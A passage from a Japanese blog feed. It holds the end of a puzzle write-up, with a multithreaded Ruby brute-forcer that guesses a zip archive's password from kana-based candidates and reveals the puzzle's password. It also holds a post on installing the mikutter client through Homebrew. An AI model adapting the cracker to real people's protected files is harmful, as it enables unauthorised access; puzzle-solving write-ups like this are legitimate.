<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># kana 50 components</span>
</span><span class='line'><span class="n">vowel5</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;i&#39;</span><span class="p">,</span> <span class="s1">&#39;u&#39;</span><span class="p">,</span> <span class="s1">&#39;e&#39;</span><span class="p">,</span> <span class="s1">&#39;o&#39;</span><span class="o">]</span>
</span><span class='line'><span class="n">consonant5</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;k&#39;</span><span class="p">,</span> <span class="s1">&#39;s&#39;</span><span class="p">,</span> <span class="s1">&#39;sh&#39;</span><span class="p">,</span> <span class="s1">&#39;t&#39;</span><span class="p">,</span> <span class="s1">&#39;ch&#39;</span><span class="p">,</span> <span class="s1">&#39;n&#39;</span><span class="p">,</span> <span class="s1">&#39;h&#39;</span><span class="p">,</span> <span class="s1">&#39;m&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="s1">&#39;g&#39;</span><span class="p">,</span> <span class="s1">&#39;z&#39;</span><span class="p">,</span> <span class="s1">&#39;j&#39;</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;p&#39;</span><span class="o">]</span>
</span><span class='line'><span class="n">vowel3</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;u&#39;</span><span class="p">,</span> <span class="s1">&#39;o&#39;</span><span class="o">]</span>
</span><span class='line'><span class="n">consonant3</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;y&#39;</span><span class="p">,</span> <span class="s1">&#39;ky&#39;</span><span class="p">,</span> <span class="s1">&#39;sy&#39;</span><span class="p">,</span> <span class="s1">&#39;ts&#39;</span><span class="p">,</span> <span class="s1">&#39;ny&#39;</span><span class="p">,</span> <span class="s1">&#39;hy&#39;</span><span class="p">,</span> <span class="s1">&#39;by&#39;</span><span class="p">,</span> <span class="s1">&#39;gy&#39;</span><span class="p">,</span> <span class="s1">&#39;py&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="o">]</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c1"># kana list</span>
</span><span class='line'><span class="n">list</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;&#39;</span><span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">v</span> <span class="k">in</span> <span class="n">vowel5</span> <span class="k">do</span>
</span><span class='line'>  <span class="n">list</span><span class="o">.</span><span class="n">push</span> <span class="n">v</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">c</span> <span class="k">in</span> <span class="n">consonant5</span> <span class="k">do</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">v</span> <span class="k">in</span> <span class="n">vowel5</span> <span class="k">do</span>
</span><span class='line'>      <span class="n">list</span><span class="o">.</span><span class="n">push</span> <span class="n">c</span> <span class="o">+</span> <span class="n">v</span>
</span><span class='line'>      <span class="n">list</span><span class="o">.</span><span class="n">push</span> <span class="n">c</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="n">v</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">c</span> <span class="k">in</span> <span class="n">consonant3</span> <span class="k">do</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">v</span> <span class="k">in</span> <span class="n">vowel3</span> <span class="k">do</span>
</span><span class='line'>      <span class="n">list</span><span class="o">.</span><span class="n">push</span> <span class="n">c</span> <span class="o">+</span> <span class="n">v</span>
</span><span class='line'>      <span class="n">list</span><span class="o">.</span><span class="n">push</span> <span class="n">c</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="n">v</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">list</span><span class="o">.</span><span class="n">push</span> <span class="s1">&#39;nn&#39;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">locker</span> <span class="o">=</span> <span class="no">Mutex</span><span class="o">::</span><span class="kp">new</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Wordlist generator</span>
</span><span class='line'><span class="n">queue</span> <span class="o">=</span> <span class="o">[]</span>
</span><span class='line'><span class="no">Thread</span><span class="o">.</span><span class="n">start</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">q</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="o">]</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">p0</span> <span class="k">in</span> <span class="n">list</span> <span class="k">do</span>
</span><span class='line'>      <span class="k">for</span> <span class="n">p1</span> <span class="k">in</span> <span class="n">list</span> <span class="k">do</span>
</span><span class='line'>          <span class="k">for</span> <span class="n">p2</span> <span class="k">in</span> <span class="n">list</span> <span class="k">do</span>
</span><span class='line'>              <span class="k">for</span> <span class="n">p3</span> <span class="k">in</span> <span class="n">list</span> <span class="k">do</span>
</span><span class='line'>                  <span class="k">for</span> <span class="n">p4</span> <span class="k">in</span> <span class="n">list</span> <span class="k">do</span>
</span><span class='line'>                      <span class="k">for</span> <span class="n">p5</span> <span class="k">in</span> <span class="n">list</span> <span class="k">do</span>
</span><span class='line'>                          <span class="n">q</span><span class="o">[</span><span class="mi">5</span><span class="o">]</span> <span class="o">=</span> <span class="n">p5</span>
</span><span class='line'>                          <span class="n">qq</span> <span class="o">=</span> <span class="n">q</span><span class="o">.</span><span class="n">join</span>
</span><span class='line'>                          <span class="k">unless</span> <span class="n">qq</span> <span class="o">=~</span> <span class="sr">/^(.)\1/</span> <span class="k">then</span>
</span><span class='line'>                              <span class="n">locker</span><span class="o">.</span><span class="n">synchronize</span> <span class="p">{</span> <span class="n">queue</span><span class="o">.</span><span class="n">push</span> <span class="n">qq</span> <span class="p">}</span>
</span><span class='line'>                          <span class="k">end</span>
</span><span class='line'>                      <span class="k">end</span>
</span><span class='line'>                      <span class="n">q</span><span class="o">[</span><span class="mi">4</span><span class="o">]</span> <span class="o">=</span> <span class="n">p4</span>
</span><span class='line'>                  <span class="k">end</span>
</span><span class='line'>                  <span class="n">q</span><span class="o">[</span><span class="mi">3</span><span class="o">]</span> <span class="o">=</span> <span class="n">p3</span>
</span><span class='line'>              <span class="k">end</span>
</span><span class='line'>              <span class="n">q</span><span class="o">[</span><span class="mi">2</span><span class="o">]</span> <span class="o">=</span> <span class="n">p2</span>
</span><span class='line'>          <span class="k">end</span>
</span><span class='line'>          <span class="n">q</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="n">p1</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>      <span class="n">q</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">p0</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c1"># Password cracker</span>
</span><span class='line'><span class="nb">puts</span> <span class="s1">&#39;Cracking...&#39;</span>
</span><span class='line'><span class="n">thread_count</span> <span class="o">=</span> <span class="mi">128</span>
</span><span class='line'><span class="n">threads</span> <span class="o">=</span> <span class="o">[]</span>
</span><span class='line'><span class="n">found</span> <span class="o">=</span> <span class="kp">false</span>
</span><span class='line'><span class="n">thread_count</span><span class="o">.</span><span class="n">times</span> <span class="k">do</span> <span class="o">|</span><span class="n">i</span><span class="o">|</span>
</span><span class='line'>  <span class="n">threads</span> <span class="o">&lt;&lt;</span> <span class="no">Thread</span><span class="o">.</span><span class="n">start</span> <span class="p">{</span>
</span><span class='line'>      <span class="kp">loop</span> <span class="k">do</span>
</span><span class='line'>          <span class="k">break</span> <span class="k">if</span> <span class="n">found</span>
</span><span class='line'>          <span class="k">break</span> <span class="k">unless</span> <span class="n">queue</span>
</span><span class='line'>          <span class="n">pass</span> <span class="o">=</span> <span class="n">locker</span><span class="o">.</span><span class="n">synchronize</span> <span class="p">{</span> <span class="n">queue</span><span class="o">.</span><span class="n">shift</span> <span class="p">}</span> <span class="o">+</span> <span class="s2">&quot;misaki&quot;</span>
</span><span class='line'>          <span class="n">t</span> <span class="o">=</span> <span class="nb">system</span> <span class="s2">&quot;7za x -p</span><span class="si">#{</span><span class="n">pass</span><span class="si">}</span><span class="s2"> -so mondai5.zip &gt; /dev/null 2&gt; /dev/null&quot;</span>
</span><span class='line'>          <span class="k">if</span> <span class="n">t</span> <span class="k">then</span>
</span><span class='line'>              <span class="n">found</span> <span class="o">=</span> <span class="kp">true</span>
</span><span class='line'>              <span class="nb">puts</span> <span class="s1">&#39;## PASS FOUND ##&#39;</span>
</span><span class='line'>              <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;pass.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span> <span class="p">{</span><span class="o">|</span><span class="n">f</span><span class="o">|</span> <span class="n">f</span><span class="o">.</span><span class="n">puts</span> <span class="n">pass</span> <span class="p">}</span>
</span><span class='line'>              <span class="nb">puts</span> <span class="s1">&#39;pass saved.&#39;</span>
</span><span class='line'>          <span class="k">end</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">threads</span><span class="o">.</span><span class="n">each</span> <span class="p">{</span> <span class="o">|</span><span class="n">th</span><span class="o">|</span> <span class="n">th</span><span class="o">.</span><span class="n">join</span> <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>1時間ほどお風呂に入って放置していたら、答えが吐き出されていました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span><span class="nb">time</span> ./solver.rb
</span><span class='line'>Cracking...
</span><span class='line'><span class="c">## PASS FOUND ##</span>
</span><span class='line'>pass saved.
</span><span class='line'>
</span><span class='line'>real    16m44.573s
</span><span class='line'>user    30m36.171s
</span><span class='line'>sys     18m7.269s
</span></code></pre></td></tr></table></div></figure>


<p>潮岬（読み：しおのみさき）の「潮」の字を「うしお」と読み違えて（？）パスワードに設定していたようです。</p>

<p>このパスワードを入力することでmondai5.zipを展開することができました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>7z x mondai5.zip
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span><span class='line'>p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>utf8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,4 CPUs<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Processing archive: mondai5.zip
</span><span class='line'>
</span><span class='line'>Extracting  hint5.txt
</span><span class='line'>Enter password <span class="o">(</span>will not be echoed<span class="o">)</span> :
</span><span class='line'>
</span><span class='line'>Extracting  mondai5
</span><span class='line'>Extracting  mondai6.zip
</span><span class='line'>
</span><span class='line'>Everything is Ok
</span><span class='line'>
</span><span class='line'>Files: 3
</span><span class='line'>Size:       70380412
</span><span class='line'>Compressed: 70378640
</span></code></pre></td></tr></table></div></figure>


<!--

$ 7za x mondai5.zip -pushiomisaki

7-Zip (a) [64] 9.38 beta  Copyright (c) 1999-2014 Igor Pavlov  2015-01-03
p7zip Version 9.38.1 (locale=ja_JP.UTF-8,Utf16=on,HugeFiles=on,4 CPUs)

Processing archive: mondai5.zip

Extracting  hint5.txt
Extracting  mondai5
Extracting  mondai6.zip

Everything is Ok

Files: 3
Size:       70380412
Compressed: 70378640

-->


<p>mondai5以降のWrite-upは明日公開します。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OS X向けmikutterパッケージ(Homebrew)作ったよ]]></title>
    <link href="http://mzyy94.com/blog/2015/03/13/mikutter-brew-formula/"/>
    <updated>2015-03-13T10:48:00+09:00</updated>
    <id>http://mzyy94.com/blog/2015/03/13/mikutter-brew-formula</id>
    <content type="html"><![CDATA[<p>3月13日ですがミクの日です。</p>

<p>mikutterをご存知ない方はいないと思いますが、簡単に説明すると、日本で一番有名なツイッタークライアントのことです。
このmikutter、Linuxの幾つかのメジャーなディストリビューションにはパッケージが用意されているのですが、
革新的なOSであるOS Xにはパッケージが存在せず、導入する際には各自ちまちまと依存関係をクリアしていかなければいけないのです。</p>

<p>新しいMacBookが発表されて世のOS Xユーザーも0.1‰ほど増えるだろうというこの時期に、mikutterがパッケージ管理されない状態が続いていていいのでしょうか。</p>

<p>そんな自問自答からOS X用パッケージマネージャーの<a href="http://brew.sh/index_ja.html">Homebrew</a>向けにパッケージを作ったのでご報告です。</p>

<!-- more -->


<h1>Brew formulae</h1>

<p>Homebrewでは、パッケージをformulaという形で管理しています。
このformulaは、パッケージの依存関係とソースコードやバイナリの場所、そしてインストール処理を行うスクリプトが書かれているRubyのコードでできています。
新しいパッケージを追加したい場合などはこのformulaを作成し、HomebrewのリポジトリにPull-Requestを行う事で大元のパッケージ群に追加してもらうことができます。
この新しいformulaの作成はbrewコマンドで行うことができます。
詳しくは<a href="https://github.com/Homebrew/homebrew/blob/master/share/doc/homebrew/Formula-Cookbook.md">homebrew/Formula-Cookbook.md at master · Homebrew/homebrew</a>を参考にしてください。</p>

<h1>mikutter formula</h1>

<p><del>
前節のようにしてPull-Requestを行っている状態のBrewパッケージとして、mikutter formulaを作成しました。
mikutterを動作させる上で必要なライブラリ等の依存関係も解決してインストールするようにできています。
</del></p>

<p><del>
<a href="https://github.com/Homebrew/homebrew/pull/37642">mikutter 3.2.2 (new formula) by mzyy94 · Pull Request #37642 · Homebrew/homebrew</a>
</del></p>

<p><del>
このformulaがHomebrewのリポジトリにマージされればコマンド1行打ち込むだけでmikutterのインストールが完了するのですが、
まだマージされていないので2行のコマンドを打つ必要があります。
</del></p>

<p><ins datetime="2015-05-29T19:02:42+09:00">訂正：homebrew側のビルドBotでMountain Lionにてエラーが出るためマージされませんでした。
そのため、mikutterのアップデートに追従できないため、別でリポジトリを作成したのでこちらのFormulaを利用してください。</p>

<ul>
<li><a href="https://github.com/mzyy94/homebrew-mikutter">mzyy94/homebrew-mikutter</a></li>
</ul>


<p>こちらでも2行のコマンドでインストールできます。
</ins></p>

<p>今までは、 tar-ballをダウンロードしてGTK+インストールしてgemインストールして&#8230; と、10行近くコマンドを打ち込まなければいけなかったので2行でも大きな進歩と言えます。</p>

<h1>#mikutterInstallBattle</h1>

<p>皆さん大好き#mikutterInstallBattleの時間です。</p>

<p>まず、最低限必要なものは以下の2つです。</p>

<ul>
<li><a href="http://brew.sh">Homebrew</a></li>
<li><a href="https://xquartz.macosforge.org">Xquartz.app</a></li>
</ul>


<p>パッケージマネージャーのHomebrewとX11アプリケーションのためのX Window SystemであるXquartzを導入しておくだけでいいです。</p>

<p>あとはHomebrewのコマンドを叩くだけ。
<del>
執筆時点(2015/3/13 10:24:33+JST)ではまだPull-Requestはマージされていないので、まずPull-Requestからformulaを引っ張ってきます。
</del></p>

<p><del>
$ brew pull 37642
</del></p>

<p><ins datetime="2015-05-29T19:02:42+09:00">別リポジトリからのtapとして導入するため、以下のコマンドでmikutterのFormulaを取得します。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ brew tap mzyy94/mikutter</span></code></pre></td></tr></table></div></figure>


<p></ins></p>

<p>無事formulaが取得できたらあとは、</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ brew install mikutter</span></code></pre></td></tr></table></div></figure>


<p>でインストールができます。</p>

<p>そして、</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ mikutter</span></code></pre></td></tr></table></div></figure>


<p>で起動します。
以上です。</p>

<h1>日本語入力</h1>

<p>日本語入力はインストールしたての状態ではできないので各自ぐぐってがんばってください。</p>
]]></content>
  </entry>
  
</feed>
